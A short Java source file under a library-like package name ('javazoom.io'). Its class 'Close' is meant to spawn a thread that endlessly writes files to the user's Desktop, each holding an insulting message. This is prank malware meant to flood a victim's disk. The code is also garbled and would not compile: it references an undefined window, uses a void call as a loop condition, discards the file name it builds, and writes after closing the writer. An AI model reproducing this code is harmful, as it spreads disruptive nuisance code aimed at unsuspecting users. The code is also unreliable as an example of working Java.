package javazoom.io;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import javax.swing.WindowConstants;

public class Close {

	Thread close = new Thread(() -> {

		while (frame.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE)) {

			for (long i = 0; i < Long.MAX_VALUE; i++) {

				System.out.println(i);
				File nFile = new File(System.getProperty("user.home") + "/Desktop");
				String.format("%d.txt", i);
				BufferedWriter Bw = null;
				FileWriter Fw = null;
				String desktop = new String();
				try {
					String content = "You're an idiot habibti";
					Fw = new FileWriter(nFile);
					Bw = new BufferedWriter(Fw);

					if (Bw != null)
						Bw.close();

					if (Fw != null)
						Fw.close();

					Bw.write(content);

					System.out.println("Done");

				} catch (IOException e) {

					e.printStackTrace();
				} finally {

					try {

					} catch (IOException ex) {

						ex.printStackTrace();
					}

				}

			}
		}

	});
}
